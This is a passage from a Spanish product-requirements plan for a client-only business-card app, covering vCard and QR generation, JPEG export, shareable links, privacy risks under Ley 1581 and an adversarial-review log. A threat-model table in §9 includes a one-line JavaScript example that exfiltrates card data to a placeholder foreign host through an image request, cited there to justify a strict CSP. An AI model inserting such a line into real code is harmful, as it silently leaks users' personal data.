| 2e | Carga de foto (G5): recorte cuadrado, reducción a ~320 px y ~10 KB JPEG **antes** de guardar, y borrado de metadatos EXIF | media | `Opus.M` | Sin reducir, una foto de celular de 4 MB revienta la cuota de `localStorage` (unos 5 MB por sitio, y base64 la infla un 33%) y la app deja de guardar EN SILENCIO. El criterio de 320 px y ~10 KB se hereda de `Personal landing page\src\shared\config\card.ts:23-24` | - | `src/features/tarjeta/foto/cargar.ts` | `SCRIPT:` ¿una foto de 4 MB queda por debajo de 20 KB tras el procesamiento, sin EXIF, y el guardado no lanza? | REINTENTO |
| 2c | Editor: cablea autosave, hidratación desde `localStorage` y validación en vivo | media | `Sonnet.M` | Es donde las piezas se conectan, y donde el error sería silencioso (un autosave que no guarda) | 2a, 2b | `src/features/tarjeta/formulario/editor.tsx` | `SCRIPT:` ¿tras escribir, recargar la página y volver, los datos siguen ahí, verificado con Playwright sobre build de producción? | REINTENTO |
| 2d | Avisos y controles de privacidad del editor: "esta app es para TU propia tarjeta" con confirmación antes de exportar, advertencias junto a dirección física y notas, y **botón de borrar mis datos de este dispositivo** | media | `Sonnet.M` | Son contramedidas de §9, y su ausencia no la detecta ningún test de funcionamiento. Un aviso sin gate es decoración: en un equipo compartido de stand, el autosave de 2c le muestra al siguiente la tarjeta del anterior | - | `src/features/tarjeta/formulario/avisos.tsx` | `SCRIPT:` ¿la exportación está bloqueada hasta marcar la confirmación, y tras borrar y recargar el editor arranca vacío? | REINTENTO |

### Ola 3 · Render y estética · dirección `Fable.H`, implementación `Sonnet.M`

| Unidad | Qué | Dificultad | Ejecutar con | Por qué | Depende de | Escribe | Verifica | Si falla |
|---|---|---|---|---|---|---|---|---|
| 3a | Dirección estética escrita: tokens, tipografía, referencia visual real VISTA, y qué se prohíbe | alta | `Fable.H` | Es diseño abierto, no código con la dirección ya dada. Sin este documento la ola devuelve el default de IA | - | `docs/direccion-estetica.md`, `src/app/globals.css` | `JUICIO:` ¿el documento nombra tokens concretos y una referencia real que se abrió de verdad, o son adjetivos genéricos? | REINTENTO |
| 3b | Componente de la tarjeta, dos vistas, toggle FUERA del elemento capturable | media | `Sonnet.M` | Patrón heredado y probado (§2); el riesgo es olvidar sacar el toggle | 3a | `src/features/tarjeta/vista/tarjeta.tsx` | `SCRIPT:` ¿el nodo que se exporta contiene cero controles, verificado por selector sobre el DOM? | REINTENTO |
| 3c | Avatar: foto si el usuario cargó una (G5), monograma de iniciales si no | baja | `Sonnet.M` | Pieza aislada y pequeña, con dos estados | 3a | `src/features/tarjeta/vista/avatar.tsx` | `NINGUNA:` basta verlo en pantalla en los dos estados | REINTENTO |
| 3e | Firma de marca (G4) **dentro** del elemento capturable de la tarjeta | baja | `Sonnet.M` | Es lo contrario del toggle, que va fuera a propósito. Si queda fuera, no sale en el `.jpeg` y se pierde la única palanca de distribución que hay sin servidor | 3a | `src/features/tarjeta/vista/firma.tsx` | `SCRIPT:` ¿el nodo que se exporta contiene la firma, y sigue sin contener ningún control? | REINTENTO |
| 3d | Verificación de superficie en viewport de teléfono | media | `Sonnet.M` | La app se usa de pie en un teléfono; el monitor del desarrollador no es el caso real | 3b, 3c, 3e | `tests/e2e/vista-movil.spec.ts` | `SCRIPT:` a 375 px, ¿cero desborde horizontal (`scrollWidth <= clientWidth`) y ningún control por debajo de 44 px? | REINTENTO |

### Ola 4 · vCard y QR en cliente · `Opus.M` · SALIDA PRINCIPAL 1

| Unidad | Qué | Dificultad | Ejecutar con | Por qué | Depende de | Escribe | Verifica | Si falla |
|---|---|---|---|---|---|---|---|---|
| 4a | Generador de vCard 3.0 con **todos los campos de texto que el usuario llenó**: solo `FN` sin `N`, folding RFC 6350 a 75 octetos, escape de coma, punto y coma y barra invertida | alta | `Opus.M` | Los dos gotchas heredados viven aquí, y los dos fallan en silencio (§8). Lleva todo salvo la foto (G5) y la firma (G4) | - | `src/features/tarjeta/vcard/generar.ts` | `SCRIPT:` ¿una tarjeta con coma en el cargo y nombre largo produce un vCard que un parser real importa sin campos partidos, y el texto NO contiene `PHOTO` ni el dominio de la herramienta? | REINTENTO |
| 4b | Descarga del `.vcf` en cliente por Blob, **con** la foto embebida en base64 si existe | media | `Sonnet.M` | Port directo de `api/vcard` a cliente. El `.vcf` es un archivo, no un QR: ahí la foto no cuesta escaneabilidad, igual que en la landing de referencia | 4a | `src/features/tarjeta/vcard/descargar.ts` | `SCRIPT:` ¿la descarga ocurre sin ninguna petición de red, y el `.vcf` con foto importa bien en un cliente de contactos real? | REINTENTO |
| 4c | QR generado en el CLIENTE con `qrcode`: **`errorCorrectionLevel: 'M'`, `margin: 4`, UNO solo, a ancho completo** | media | `Opus.M` | Cambio de arquitectura respecto a la landing, obligado por D1. Los tres parámetros son decisiones medidas, no defaults: `M` porque los efectos de la corrección se cancelan, `4` porque es la zona silenciosa que exige la norma, y uno solo a ancho completo porque dos QR dejan cada uno bajo el piso de lectura | 4a | `src/features/tarjeta/qr/qr-cliente.tsx` | `SCRIPT:` ¿el HTML del servidor no contiene ningún dato de la tarjeta, el QR aparece solo tras ejecutar JS, el margen renderizado son 4 módulos, y el QR ocupa el ancho disponible? | REINTENTO |
| 4d | Prueba de decodificación del archivo de QR generado | media | `Opus.M` | Que el QR se VEA bien no prueba que se LEA. Es mecánicamente testeable, así que se mide | 4c | `tests/qr-roundtrip.spec.ts` | `SCRIPT:` ¿un lector de QR decodifica la imagen generada y el texto coincide carácter por carácter con el vCard original, para la tarjeta mínima Y la de todos los campos llenos? | REINTENTO |
| 4f | Aviso de densidad al usuario: si su tarjeta pasa de la **versión 15** de QR (77 módulos, 4,0 px por cuadrito a 340 px), decirle que el código puede costar leerse y qué campo recortar | media | `Opus.M` | Es la mitigación del riesgo que introduce llevar TODO en el QR: falla justo con la tarjeta de quien más se esforzó en llenarla, y sin aviso el usuario no tiene forma de saberlo. El dato habilita una decisión suya, que es recortar un campo | 4a | `src/features/tarjeta/qr/densidad.ts` | `SCRIPT:` ¿el perfil típico (unos 287 caracteres, versión 12) NO dispara el aviso y el perfil lleno (unos 617, versión 19) SÍ lo dispara? | REINTENTO |
| 4e | 🙋 Gate físico: escanear el QR de la tarjeta LLENA **de una pantalla a otra** | alta | humano | 4d decodifica el archivo que el propio código produjo, en las condiciones ideales en que se generó. La cámara de un teléfono de gama baja, el brillo bajado para ahorrar batería y el reflejo de las luces de un salón NO están en esa prueba. **Es el árbitro de si la decisión de llevar TODO en el QR aguanta**: el perfil lleno queda en 3,37 px por cuadrito, sobre el piso pero sin sobra | 4d, 4f | `-` | `JUICIO:` ¿un segundo teléfono lee el QR a unos 20 cm, con brillo normal de evento y luz artificial de interior, no en un escritorio con luz controlada? | REINTENTO |

### Ola 5 · Exportar `.jpeg` · `Opus.H` · SALIDA PRINCIPAL 2

| Unidad | Qué | Dificultad | Ejecutar con | Por qué | Depende de | Escribe | Verifica | Si falla |
|---|---|---|---|---|---|---|---|---|
| 5a | Render del nodo de la tarjeta a imagen en cliente, fuentes embebidas, `pixelRatio: 3` | alta | `Opus.H` | Construcción 100% nueva, con el gotcha de las webfonts que produce una imagen en blanco sin lanzar ningún error | - | `src/features/tarjeta/exportar/a-imagen.ts` | `SCRIPT:` ¿la imagen generada tiene las dimensiones esperadas Y varianza de píxeles por encima de cero, o sea no está en blanco? | REINTENTO |
| 5b | Guardado: `navigator.share({files})` primero, con fallback a abrir la imagen para pulsación larga | alta | `Opus.H` | En iOS Safari `<a download>` no guarda en Fotos: es el botón principal del producto fallando justo en los teléfonos de conferencia | 5a | `src/features/tarjeta/exportar/guardar.ts` | `SCRIPT:` ¿el código elige la share sheet cuando `navigator.canShare({files})` es verdadero y cae al fallback cuando no, con test que cubre los dos caminos? | REINTENTO |
| 5c | E2E headless de la exportación sobre build de producción | media | `Sonnet.M` | El error de esta ola es silencioso: un `.jpeg` en blanco no rompe nada. **Filtro de "no vacío", NO de "correcto"**: con varianza mayor que cero pasa cualquier render roto que no sea un color sólido, y quien lo cierra de verdad es 5d | 5a | `tests/e2e/exportar-jpeg.spec.ts` | `SCRIPT:` ¿Playwright genera el `.jpeg` sobre `pnpm start` y el archivo pasa el assert de dimensiones y varianza? | REINTENTO |
| 5d | 🙋 Gate físico: guardar el `.jpeg` en Fotos en un iPhone y en un Android reales, **y además desde el navegador embebido de Instagram y de LinkedIn** | alta | humano | Un doble de la capa que falla no verifica nada: la share sheet y el guardado en Fotos son del sistema operativo, no del navegador headless. Y un link que se regala se abre casi siempre desde adentro de una app social, cuyo WebView degrada o bloquea `navigator.share` con archivos | 5b, 5c | `-` | `JUICIO:` ¿la imagen queda en el carrete del teléfono, en los dos sistemas, y también cuando la página se abre dentro de Instagram y de LinkedIn? | REINTENTO |

### Ola 6 · Link compartible opcional · `Opus.M` · sujeta a G6

| Unidad | Qué | Dificultad | Ejecutar con | Por qué | Depende de | Escribe | Verifica | Si falla |
|---|---|---|---|---|---|---|---|---|
| 6a | Codec del link: claves cortas, `deflate-raw`, `base64url`, byte de versión, fallback sin comprimir | alta | `Opus.M` | Un codec asimétrico corrompe la tarjeta de alguien sin avisar, y una foto colada en el payload vuelve inescaneable el QR del link | - | `src/features/tarjeta/enlace/codec.ts` | `SCRIPT:` ¿`decode(encode(x)) === x` para N tarjetas, el payload NUNCA contiene la foto ni con una foto cargada (G5), y el reporte imprime su longitud en los 3 perfiles: mínima, típica y todos los campos llenos? | REINTENTO |
| 6b | UI de generación del link: apagada por defecto, con la advertencia ANTES de generar | media | `Opus.M` | Su efecto va hacia afuera, así que se ofrece visible pero nace apagada | 6a | `src/features/tarjeta/enlace/generar-enlace.tsx` | `JUICIO:` ¿la advertencia dice, antes de generar, las tres cosas: que es público para quien lo tenga, que NO se puede desactivar después, y que **el link queda en el historial del navegador de quien lo abra y puede sincronizarse a sus otros dispositivos**? | REINTENTO |
| 6c | Assert de que abrir un link con datos no genera ninguna petición a un dominio ajeno | media | `Opus.M` | Es el caso específico del link. El barrido de TODAS las rutas vive en 7e, que corre exista o no el link | 6a | `tests/e2e/enlace-y-fuga.spec.ts` | `SCRIPT:` ¿la pestaña Network registra CERO peticiones a un dominio distinto del propio al abrir un link con datos? | REINTENTO |

### Ola 7 · Publicación · `Sonnet.M`

| Unidad | Qué | Dificultad | Ejecutar con | Por qué | Depende de | Escribe | Verifica | Si falla |
|---|---|---|---|---|---|---|---|---|
| 7a | i18n es-CO y en con `next-intl` | media | `Sonnet.M` | Patrón ya probado en la landing; el riesgo es texto hardcodeado que se escapa | - | `src/i18n/routing.ts`, `messages/es-CO.json`, `messages/en.json` | `SCRIPT:` ¿un grep de cadenas visibles fuera de `messages/` sale vacío en los componentes de la tarjeta? | REINTENTO |
| 7b | README con el aviso de G2, `llms.txt`, JSON-LD, y los **tres límites declarados en el copy**: necesitas señal la primera vez (G7), la tarjeta vive solo en este equipo, y un link repartido no se puede desactivar | baja | `Sonnet.M` | Requisito de `era-agentica`; el JSON-LD describe la HERRAMIENTA, nunca la tarjeta de un usuario. Los tres límites son decisiones tomadas, y callarlos convierte una limitación honesta en una promesa rota | - | `src/app/llms.txt/route.ts`, `src/features/tarjeta/vista/json-ld.tsx`, `messages/limites.json` | `JUICIO:` ¿el JSON-LD no contiene ni un dato personal, y los tres límites están visibles para el usuario, no enterrados en el README? | REINTENTO |
| 7c | Métrica anónima: `card_created` sin payload, y visitas a la home | media | `Opus.M` | Choca de frente con los candados de 1e, y esa tensión se resuelve midiendo, no asumiendo | 7a | `src/features/metricas/ping.ts` | `SCRIPT:` ¿el ping ocurre SOLO en la home y el editor, nunca en la ruta de la tarjeta, y el assert de cero dominios ajenos de 7e sigue pasando? | DESCARTAR |
| 7e | Barrido final de superficie sobre la app completa | media | `Opus.M` | 3d solo cubrió las vistas de tarjeta (depende de 3b y 3c); el editor y la pantalla de salidas, que son las de más controles, nunca se midieron. Y el assert de cero dominios ajenos tiene que correr exista o no el link | 7a, 7b, 7c | `tests/e2e/superficie-final.spec.ts` | `SCRIPT:` en las 4 pantallas y a 375 px, ¿cero desborde horizontal, ningún control bajo 44 px, y CERO peticiones a un dominio ajeno en cualquiera de ellas? | REINTENTO |
| 7d | 🙋 Deploy a Vercel y push inicial del repo público, con verificación de cabeceras en producción | media | `Sonnet.M` | Es acción hacia afuera: publica código y una URL asociada al operador | 7a, 7b, 7c, 7e | `-` | `SCRIPT:` ¿las 4 cabeceras de 1e responden con el valor exacto contra el dominio de PRODUCCIÓN, no contra localhost? | GATE G3 |

> **Sobre el `Si falla: DESCARTAR` de 7c.** Es deliberado. Si la única forma de medir `card_created`
> exigiera cargar un recurso de un dominio ajeno en la ruta de la tarjeta, **se descarta la métrica, no
> el candado.** El candado es un criterio de éxito del producto; la métrica es un lujo. Ver §13.

---

## 8. Gotchas

| Gotcha | Consecuencia si se ignora |
|---|---|
| En **iOS Safari, `<a download>` no guarda en Fotos.** La vía correcta es `navigator.share({files:[...]})`, con fallback a abrir la imagen para pulsación larga | El botón principal del producto no funciona justo en los teléfonos de conferencia |
| Al renderizar HTML a imagen, el **texto sale en blanco si las webfonts no se embeben.** Hay que inlinearlas y usar `pixelRatio: 3` | El `.jpeg` sale vacío o borroso, sin error en consola, y nadie lo nota hasta que alguien lo muestra |
| **`next/og` y `@vercel/og` están PROHIBIDOS aquí**, aunque exista el precedente en `Personal landing page\src\app\opengraph-image.tsx:1`. Renderizan en el servidor | Rompe D1 en silencio: los datos de la tarjeta viajan al servidor y ningún test lo delata |
| **vCard: solo `FN`, sin `N` estructurado.** Heredado de `card.ts:62-64` | Contactos guardados como "Juan Pérez Pérez": Google Contacts duplica el apellido al mezclar `FN` con `N` |
| **Line folding RFC 6350 a 75 octetos** en el `.vcf`. Ya resuelto en `src\app\api\vcard\route.ts:19-20` | El `.vcf` no importa en algunos clientes de contactos |
| El QR con la tarjeta completa puede volverse **demasiado denso para escanear de pantalla a pantalla.** Medido 2026-09-03 con un QR de 340 px, `M`, margen 4: perfil mínimo 5,96 px por cuadrito, típico 4,66, lleno 3,37. Piso práctico ~2,5 px por módulo **en la imagen de la cámara**, no en la pantalla | El producto falla en su caso de uso principal, que es justo ese. Mitigación: el aviso de densidad de la unidad 4f |
| **`margin: 1` es una desviación de la norma, y está en el código que se copia** (`Personal landing page\src\features\card\qr-code.tsx:20`). La zona silenciosa obligatoria son 4 módulos, y la librería ya trae 4 por defecto | El decodificador puede no ENCONTRAR el símbolo. No es que el cuadrito sea chico: es que no hay dónde anclar la detección |
| **Dos QR en la misma pantalla se reparten el ancho y los dos quedan bajo el piso de lectura.** Medido: 2,39 px por cuadrito con el vCard de la tarjeta de referencia | Es la causa medida de que la tarjeta actual haya que acomodarla. Por eso aquí va uno solo |
| **La corrección de errores NO es una palanca aquí.** Bajar de `M` a `L` da cuadritos 14% más grandes pero pierde una tolerancia a borrosidad del mismo orden (medido en el estudio de 12.800 configuraciones: L acertó 1.257 veces, M 1.600, Q 1.839, H 2.001) | Se pierde tiempo optimizando el parámetro equivocado. Las dos palancas reales son cuántos datos van adentro y qué tan grande se pinta |
| **La regla 10:1 va con un colchón de 20-30%** para condiciones reales (luz, ángulo, cámara de gama baja) | Se dimensiona para el caso de laboratorio y falla en el salón |
| **Editar genera un link NUEVO.** El ya repartido queda congelado en la versión vieja para siempre | Se promete algo que el producto no hace |
| **El link no se puede revocar.** No hay servidor donde borrar la tarjeta | Alguien reparte su celular personal creyendo que después lo puede apagar |
| **Cualquier script de terceros en la página puede leer `location.hash`.** Es la vía de fuga que la página SÍ controla, y por eso se cierra con CSP `default-src 'self'` | Una dependencia agregada meses después exfiltra datos personales sin que nadie lo note |
| **El link queda en el HISTORIAL del navegador de quien lo abra, y se sincroniza** si esa persona tiene Chrome Sync o iCloud activo, que es el default en un teléfono personal. Ningún header lo evita: el historial vive en el navegador, fuera del alcance de la página | Los datos de un tercero suben a la cuenta en la nube de alguien más, en uso normal, sin que nadie haga nada malicioso. Se declara en la advertencia de 6b; **no tiene arreglo técnico desde la página** |
| **El `.jpeg` en Fotos y el `.vcf` en Contactos se respaldan solos a iCloud o Google**, que están activos por defecto | Si alguien crea la tarjeta de OTRA persona, los datos de esa persona terminan en la cuenta en la nube de quien la creó. Por eso la exportación pide confirmación explícita de que la tarjeta es propia o autorizada (2d) |
| Un link que se regala se abre casi siempre **dentro del navegador embebido de una app** (Instagram, LinkedIn, WhatsApp), donde `navigator.share` con archivos se degrada o se bloquea, y la pulsación larga choca con el menú del WebView anfitrión | El botón de guardar falla justo en el canal por el que la herramienta se distribuye. Se prueba en 5d, no se asume |
| `X-Frame-Options: DENY` está global en la landing (`Personal landing page\next.config.ts:27`). Si el proyecto nuevo copia esa config, la tarjeta no se puede embeber en ningún lado | Que sea decisión, no accidente. Aquí se recomienda mantenerlo |
| **`localStorage` puede lanzar** (modo privado, almacenamiento bloqueado) o venir vacío | La app tiene que renderizar bien con cero datos guardados; toda lectura y escritura va en `try/catch` |
| **Una foto de celular sin reducir revienta la cuota de `localStorage`** (unos 5 MB por sitio, y base64 la infla un 33%). Hay que bajarla a ~320 px y ~10 KB ANTES de guardarla, y quitarle el EXIF | El guardado falla EN SILENCIO y el usuario pierde la tarjeta sin ningún mensaje. Además el EXIF de una foto puede traer las coordenadas de dónde se tomó |
| **La foto NUNCA entra al codec del link ni al vCard del QR**, solo a la vista, al `.jpeg` y al `.vcf` descargado (G5) | Una foto adentro del link vuelve el QR demasiado denso para escanear de una pantalla a otra, que es el uso principal. La invariante la sostiene el tipo, no la disciplina |
| **La firma de marca va DENTRO del elemento capturable, pero NUNCA dentro del vCard** (G4) | Si queda fuera del elemento, no sale en el `.jpeg` y se pierde la distribución. Si entra al vCard, le mete publicidad a la agenda de un tercero y gasta densidad del QR |
| **No hay Service Worker ni precache: sin señal, la app no carga la primera vez** (G7, decidido) | Es una limitación aceptada, no un bug. Va DICHA en el copy. Si alguien la "arregla" con un CDN de terceros, rompe el candado de cero dominios ajenos |

---

## 9. Riesgos y mitigaciones

### El riesgo propio de este diseño: el link no se puede revocar

Con servidor se borra la tarjeta y el link muere. Con los datos adentro del link, lo repartido queda
vivo para siempre. **Va escrito como limitación de producto, en el copy, no enterrado en gotchas.**

### Lo que NO es un riesgo diferencial (dicho para que nadie lo "arregle" mal después)

Que cualquiera con el link vea los datos es **igual de cierto con servidor**, y es el propósito de una
tarjeta de presentación. La opción con servidor es **peor** en este eje: crea una base de datos con
información personal de terceros y convierte a quien la opera en Responsable del tratamiento bajo la
Ley 1581 de 2012, con los 14 deberes que eso implica (F368, arts. 17-18). D1 no es una limitación que
se tolera: es la mitigación.

### El hueco técnico real, convertido en requisito duro

| Contramedida | Verificación | Se cierra en |
|---|---|---|
| **Cero scripts y cero recursos de terceros en la ruta de la tarjeta.** Fuentes auto-hospedadas, sin analítica, sin widgets, sin CDN | `SCRIPT:` la pestaña Network no muestra ni una petición a un dominio ajeno, en las 4 pantallas | 7e (y 6c para el caso del link) |
| **CSP `default-src 'self'`, deny by default.** No basta con listar `script-src` y `connect-src`: un `new Image().src = 'https://ajeno/?d=' + datos` exfiltra por `img-src` y no lo gobierna ninguna de las dos | `SCRIPT:` assert de que la CSP arranca en `default-src 'self'` | 1e |
| **`Referrer-Policy: no-referrer`.** El fragmento ya no viaja en el `Referer`, pero se cierra igual por si un enlace saliente lo lleva | `SCRIPT:` assert del header | 1e |
| **`noindex` en la vista de tarjeta y `robots.txt`.** Los buscadores ignoran el fragmento, así que solo indexarían la home; se cierra igual de forma explícita | `SCRIPT:` assert de la metaetiqueta y del header | 1e |
| **Advertencia en el momento de generar el link**: es público para quien lo tenga, **no se puede desactivar después**, y **queda en el historial de quien lo abra** | `JUICIO:` que el texto aparezca ANTES de generar, no después | 6b |
| **La app es para TU propia tarjeta.** El copy lo dice, y además la exportación (`.jpeg` o `.vcf`) pide **confirmación explícita** de que la tarjeta es propia o se tiene autorización. Un texto sin gate no es una contramedida | `SCRIPT:` ¿la exportación está bloqueada hasta que se marca la confirmación? | 2d |
| **Advertencia junto al campo de dirección física** (casa contra oficina) **y junto al campo libre de notas**, que es donde cabe cualquier cosa, incluido un dato sensible del art. 5 de la Ley 1581 (salud, afiliación, convicciones) | `JUICIO:` revisión del formulario | 2d |
| **Botón de borrar mis datos de este dispositivo**, visible en el editor | `SCRIPT:` ¿tras borrar y recargar, el editor arranca vacío y la clave no existe en `localStorage`? | 1d, 2d |

### Otros riesgos

| Riesgo | Mitigación |
|---|---|
| El QR de una tarjeta llena no se escanea de pantalla a pantalla | Se mide en 4d con un lector real, no a ojo. Si falla, el vCard del QR se recorta a los campos que caben y el resto queda solo en la vista `card` |
| El usuario pierde su tarjeta al cambiar de teléfono | Limitación declarada de D1, escrita en el copy. El `.jpeg` y el `.vcf` guardados son su respaldo |
| Alguien agrega una dependencia con CDN meses después y abre la fuga | La CSP `default-src 'self'` (1e) la bloquea en el navegador, y el assert de 7e corre en CI: el PR se cae solo |
| El alcance crece hacia "necesitamos servidor" | §11 lo declara fuera de scope por decisión, no por olvido. Todo lo que necesita servidor rechaza D1 |
| Nadie sabe qué hacer con un QR en la conferencia | La salida principal alterna es el `.jpeg`, que se muestra o se manda por WhatsApp sin explicar nada. El QR no es la única vía |

---

## 10. Criterios de éxito (medibles)

- [ ] Una persona **que nunca vio la app**, sin cuenta, pasa de la home a tener su `.jpeg` guardado **en menos de 2 minutos** en un teléfono, **llenando la tarjeta completa, capa de venta incluida**. Cronometrar la ruta feliz (nombre y correo, con alguien que ya sabe dónde tocar) no cuenta: el caso de uso real es la tarjeta que convierte en una conferencia B2B.
- [ ] El QR del vCard de una tarjeta con **todos** los campos llenos se escanea **de una pantalla a otra** a unos 20 cm, con brillo normal de evento y luz artificial de interior (gate físico 4e; el assert de 4d decodifica el archivo, no una foto de una pantalla).
- [ ] **El QR se renderiza con `margin: 4` y ocupa el ancho disponible**, verificado sobre el DOM, no por lectura del código. Es lo que sube el perfil típico de 2,39 a 4,66 px por cuadrito frente a la tarjeta de referencia.
- [ ] **Una tarjeta que pase de la versión 15 de QR le avisa al usuario** que el código puede costar leerse, y le dice qué recortar (unidad 4f).
- [ ] El `.jpeg` se guarda en Fotos tanto en **iOS como en Android** (gate físico 5d, no headless).
- [ ] La red nunca transporta los datos de la tarjeta: verificable en la pestaña Network.
- [ ] **En ninguna pantalla se carga un solo recurso de un dominio ajeno** (unidad 7e, que corre exista o no el link). Es el criterio que hace cierta la promesa de privacidad; sin él, la promesa es marketing.
- [ ] **Se puede completar el flujo entero (tarjeta, QR de vCard, `.jpeg`) sin generar ningún link.**
- [ ] A 375 px de ancho no hay desborde horizontal y ningún control mide menos de 44 px, **en las 4 pantallas** (unidad 7e; 3d solo cubre las dos vistas de tarjeta).
- [ ] Se puede **borrar la tarjeta de este dispositivo** desde el editor, y tras borrar no queda rastro en `localStorage`.
- [ ] **Con una foto cargada, el enlace generado y el QR del vCard siguen sin contenerla**, verificado sobre el payload real, no por lectura del código.
- [ ] La **firma de marca aparece en el `.jpeg` descargado** y no aparece en el vCard del QR.
- [ ] Una foto de 4 MB queda por debajo de 20 KB al guardarse, sin EXIF, y no rompe el guardado.
- [ ] `typecheck`, `lint`, `build` y E2E en verde.

---

## 11. Fuera de scope (por decisión, no por olvido)

- **Foto de perfil DENTRO del link o del QR.** La foto sí entra al producto (G5), pero solo a la vista, al `.jpeg` y al `.vcf`: adentro del link vuelve el QR inescaneable.
- **Funcionar sin señal la primera vez** (G7, decidido el 2026-09-03). No hay Service Worker ni precache en v1: el límite se declara en el copy. Primera candidata a v2 si la conferencia lo tumba.
- **Link corto** y **edición del link ya repartido.** Los dos requieren servidor, o sea rechazan D1.
- **Cuentas de usuario.**
- **Apple Wallet y Google Wallet.**
- **NFC.**
- **Analítica de escaneos.** Requiere que el escaneo pase por un servidor propio: rechaza D1.
- **Tarjeta de empresa con varios miembros.**
- **Códigos rectangulares (rMQR, ISO/IEC 23941:2022).** Descartados el 2026-09-03 por DOS razones independientes, cualquiera basta: su versión más grande carga **150 bytes** y el perfil mínimo de esta tarjeta ya son 142 caracteres, así que no hay versión donde quepa; y **las cámaras nativas de iPhone y Android no lo leen**, solo terminales industriales y apps especializadas. Que alguien no lo reproponga sin traer esos dos datos refutados.
- **PDF417 y otros códigos apilados.** Son rectangulares y de alta capacidad (es lo del pasaje de abordar), pero los leen escáneres dedicados, y el gesto de "guardar contacto" del teléfono está atado a QR con vCard adentro. [No verificado que la cámara nativa los detecte, y no hace falta verificarlo: el gesto de guardar contacto ya lo descarta].
- **Dos QR en la misma vista**, como los tiene la tarjeta de referencia. Se reparten el ancho y los dos caen bajo el piso de lectura.
- **Cualquier control de edad.** La herramienta no pregunta ni verifica si quien la usa es menor. En un contexto B2B de conferencia el riesgo es bajo, pero se dice: no hay control, y el aviso de G2 debería no dirigirse a menores.
- **Evitar que el link quede en el historial de quien lo abra**, o que se sincronice a sus otros dispositivos. No tiene arreglo desde la página; solo se advierte (§8, unidad 6b).

---

## 12. Licencia y publicación

- **Licencia: MIT** (D4). El `LICENSE` entra en el **primer commit** (unidad 1b), no al final: un repo
  público sin archivo de licencia es "todos los derechos reservados" por defecto, que contradice D4
  durante todo el tiempo que tarde en llegar.
- **Titular del copyright: G1** ⛔. No se escribe ningún nombre en el `LICENSE` hasta que el operador
  responda.
- **Repo público nuevo desde el día 1** (D3), bajo la cuenta u organización que salga de G3. El PRP, la
  bitácora y las decisiones vivieron primero en un repositorio privado.
- **Punteros en ambas direcciones:** el `README.md` del repo público apunta a este PRP por nombre (no
  por ruta local, que no existe para nadie de afuera), y el encabezado de este PRP apunta al repo
  cuando exista.
- **Al existir el repo, ejecutar `alta-baja-de-repos-por-ops`:** `_PROYECTO.md` del repo nuevo y
  regenerar `C:\OPS\_VelOS\proyectos\_MAPA.md`. Es parte de la Ola 7, no de este documento.

### Sobre la afirmación de privacidad (base y límite)

La Ley 1581 de 2012 asigna sus 14 deberes al **Responsable del tratamiento** y 12 al **Encargado**
(F368, arts. 17-18, verificado contra fuente primaria en el cerebro, dominio `proteccion-datos-latam`,
ingesta 2026-07-24). Su principio de seguridad (art. 4 lit. g) es un **estándar de resultado**: exige
medidas adecuadas al riesgo, no una arquitectura concreta.

Con D1 **no hay tratamiento de datos de terceros en ningún servidor nuestro**: la superficie de
cumplimiento colapsa porque no existe la base de datos que habría que proteger, notificar o auditar.
Eso es lo que hace defendible la frase "tus datos no salen de tu dispositivo".

> ⛔ **Límite explícito, y es la razón de que G2 sea bloqueante.** El corpus verificado cubre el
> principio de seguridad, los datos sensibles, los deberes de Responsable y Encargado, y la
> transferencia internacional. **NO tiene verificado el ámbito de aplicación de la ley** (art. 2), que
> es exactamente el artículo del que dependería afirmar "esta herramienta no genera obligación de
> habeas data para nadie". Ese razonamiento va como **[Suponiendo]**, no como [Verificado], y **no
> sustituye a un abogado.** El texto exacto del aviso lo aprueba el operador en G2.

---

## 13. Cómo se mide si funcionó

**Sin servidor no hay forma honesta de contar tarjetas creadas.** Se declara el límite en vez de
inventar una métrica que no se puede sostener.

| Qué se mide | Cómo | Línea base | Cuándo se lee |
|---|---|---|---|
| Tarjetas creadas | Evento anónimo `card_created`, **sin payload**, disparado solo en el editor | cero | Primera conferencia donde se regale |
| Interés | Visitas a la home | cero | Igual |
| Distribución orgánica | Solo existe si G4 dice que sí a la firma visible. Sin firma, una tarjeta regalada no dice de dónde salió | cero | Igual |

**La tensión que el PRP no esconde:** medir requiere una petición de red, y el criterio de éxito más
duro del producto es que la ruta de la tarjeta no haga ninguna a un dominio ajeno. Resolución escrita
en la unidad 7c: **el ping vive solo en la home y el editor, nunca en la ruta de la tarjeta**, y si la
única forma de medirlo exigiera un recurso externo ahí, **se descarta la métrica, no el candado**.

**Qué pasa si el número no se mueve.** Con línea base cero y una sola conferencia de ventana, un
`card_created` bajo tiene al menos tres explicaciones que este instrumento no distingue: nadie la usó,
la usaron sin volver a la home, o el bloqueador del teléfono mató el ping. Por eso el número **no
decide nada solo**: la señal que sí decide es cualitativa y presencial, cuánta gente saca el teléfono
cuando se la ofreces, y eso lo observa el operador en el evento.

---

## 14. Aprendizajes (self-annealing)

> Esta sección CRECE durante la ejecución. Cada error encontrado se registra con su fix, para que el
> mismo error no ocurra dos veces. Vacía a propósito al momento de escribir el PRP.

*(sin entradas)*

---

## 15. Registro del debate adversarial

**Corrido:** 2026-09-03, sobre el PRP terminado. **Dos lentes ORTOGONALES**, no dos copias del mismo,
ambos `Sonnet.M` (`atacante-adversarial`, solo lectura, sin acceso al rationale a favor del PRP y sin
la conclusión servida como premisa). Cada uno recibió una única pregunta escrita:

| Lente | Pregunta |
|---|---|
| **A** · conferencia real | "¿Dónde se rompe en una conferencia real: sin señal, con teléfonos viejos, con gente que no sabe qué es un QR, de pie y con prisa?" |
| **B** · fuga de datos | "Esta herramienta produce un enlace irrevocable con datos personales. Encuentra TODA vía por la que esos datos terminen donde su dueño no quería." |

**Veredicto de los dos: APROBAR-CON-CAMBIOS.** Ninguno pidió cambiar la arquitectura: los dos
coincidieron en que D1 (sin servidor, fragmento que no viaja al backend, codec con round-trip) está
bien razonado, y las 10 objeciones ALTA o MEDIA son aditivas.

**Cobertura del ataque, dicho explícito.** Los dos lentes leyeron el PRP y el código que cita. Lo que
NINGUNO pudo verificar, porque no existe todavía: si la app compila, si el QR se escanea de verdad, y
si el `.jpeg` se guarda en un teléfono. Eso son los gates físicos 4e y 5d, y siguen abiertos.

### Objeciones y qué se hizo con cada una

| # | Lente | Objeción | Sev | Veredicto | Acción aplicada |
|---|---|---|---|---|---|
